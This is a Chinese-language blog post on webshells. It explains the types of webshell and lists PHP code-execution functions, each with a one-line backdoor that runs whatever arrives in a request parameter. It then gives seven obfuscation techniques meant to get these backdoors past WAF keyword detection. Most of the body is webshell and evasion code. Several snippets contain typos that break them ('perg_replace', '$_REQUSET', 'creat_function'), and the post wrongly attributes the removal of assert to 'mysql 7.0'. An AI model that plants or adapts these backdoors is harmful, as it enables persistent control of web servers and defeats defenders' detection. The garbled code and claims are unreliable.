2022-01-13 web安全 1.1k 字
webshell

一：webshell介绍

1.什么是webshell？

1.webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门

2.由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具

3.攻击者可以利用webshell从而达到长期控制网站服务器的目的，并获得执行操作权

2.分类

1.大马

•大马体积大，一般在50k以上

•隐蔽性差

•功能多，一般都包括提权功能，磁盘管理，数据库连接

2.小马

•体积小，隐蔽性强

•能与图片结合在一起上传

•可以利用解析漏洞来运行

•功能少，一般只有上传功能

3.一句话木马

•代码简短，通常只有一行代码

•使用灵活，可以作为单独的文件也可以插入正常文件

•变形非常多

4.常见的代码执行函数

1.PHP中常见的代码执行函数
eval()函数
<?php @eval($_REQUEST['cmd'])?>				//@符使这行代码不会出现报错 cmd为接收参数
assert()函数

该函数在mysql数据库7.0版本就不再使用了

<?php @assert($_REQUEST['cmd'])?>
preg_replace()函数

•preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使preg_replace() 将replacement 参数当作PHP 码

•5.5版本/e修饰符被弃用；7.0版本不再支持/e修饰符

<?php @perg_replace("/abc/e",$_REQUSET['cmd'],"abcd")
?>
create_function()函数

create_function主要是用来创建匿名函数

如果没有严格对参数传递进行过滤，攻击者可以构造字符串传递给create_function()执行任意命令

<?php
    $func = creat_function(",$_REQUSET['cmd']");
	$func();
?>
array_map()函数

•array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有的组

•回调函数接受参数数目应该和传递给array_map() 函数的数组数一致

<?php
    //?func=system&cmd=ipconfig
	$func=$_REQUEST['func'];
	$cmd=$_REQUEST['cmd'];
	$array[0]=$cmd;
	$new_array=array_map($func,$array);
?>

array_filter()函数

•array_filter( array $array [, callable $callback [,int $flag = 0 ]] ) : array

•依次将array 数组中的每个值传递到callback 函数。如果callback 函数返回true，则array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变

<?php
    //?func=system&cmd=whoami
    $cmd=$_REQUEST['cmd'];
	$array1=array($cmd);
	$func=$_REQUEST['func'];
	array_filter($array1,$func);
?>

二：webshell变形免杀

1.变形的目的

waf通常以关键字判断是否为一句话木马，但是一句话木马的变形有很多。

都是为了绕过waf.

2.常见的变形方法

1.str_replace()函数

在第三个参数中，查找第一个参数，并替换成第二个参数，这里就相当于删除abc

<?php
    $a = str_replace("bac","","eabcvabcaabceabcl");		//$a = eval
	$a($_REQUSET['cmd']);
?>
2.base64_decode()函数
<?php
    $a=base64_decode("YXNzZXJ0");		//$a = assert
	$a($_REQUEST['cmd']);
?>

3.利用”.”操作符

在PHP中，字符串之间连接使用的是“点”来实现的，可以把两个或两个以上的字符串连接成一个字符串

<php
    $a="as"."se";
	$b="r"."t";
	$c=$a.$b;
	$c($_REQUEST['cmd']);
?>
4.更换数据来源
<?php
    $_REQUEST[a]($_REQUEST[cmd]); //利用方法：a=assert&cmd=phpinfo();?><?			           php@assert($_REQUEST[$_REQUEST[b]]);  //利用方法：b=cmd&cmd=phpinfo();
?>

5.替代标签

通过改变php的标签特征来绕过waf进而达到免杀的效果

<script language="php">
    @assert($_REQUEST['cmd'])
</script>
6.字符串组合隐藏关键字

将需要隐藏的字符随机打乱，首先定义一些随机字符串，再调用打乱后的字符顺序并拼接成有效的参数

<?php
    $str = 'abcsqebrt';
	$a =$str[0].$str[3].$str[3].$str[5].$str[7].$str[8];
	@$a($_REQUEST['cmd']);
?>

7.使用对象，类，内置函数实现免杀
<?php
    class magic{
    	public $xw = null;
    	public $xl = null;
    	function __construct(){
            $this->xw = 'rinv($_CBFG[n]);';		//凯撒加密方法
            $this->xl = str_rot13($this->xw);     //凯撒解密函数str_rot13偏移13位
            @eval($this->xl);
        }
}
new magic();
?>
